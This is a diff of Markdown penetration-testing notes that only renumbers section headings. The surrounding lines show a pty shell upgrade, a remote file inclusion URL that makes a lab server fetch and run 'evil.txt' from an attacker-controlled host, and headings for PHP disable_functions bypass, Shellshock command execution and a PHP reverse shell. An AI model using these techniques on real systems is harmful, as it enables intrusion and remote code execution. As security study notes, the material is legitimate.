@@ -58,7 +58,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 is used to get the TTY shell
 
-## 3. Remote file inclusion (RFI)
+## 2. Remote file inclusion (RFI)
 Executing a command via a remote php page:
 http://10.11.23.188/addguestbook.php?LANG=http://10.11.0.105:31/evil.txt%00&name=test&comment=test
 
@@ -71,7 +71,7 @@ Most modern php configuration disallows remote file includes of http URIs. For e
 allow_url_fopen = Off
 allow_url_include = Off
 ```
-## 4. Bypass PHP disable_functions
+## 3. Bypass PHP disable_functions
 ### Use PHP code to download file and list directory
 ```php
 function listDir($dir) {
@@ -134,7 +134,7 @@ function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
 }
 ?>
 ```
-### 5. Deal with missing -e option in netcat
+### 4. Deal with missing -e option in netcat
 ```php
 <?php
 function reverse_shell() {
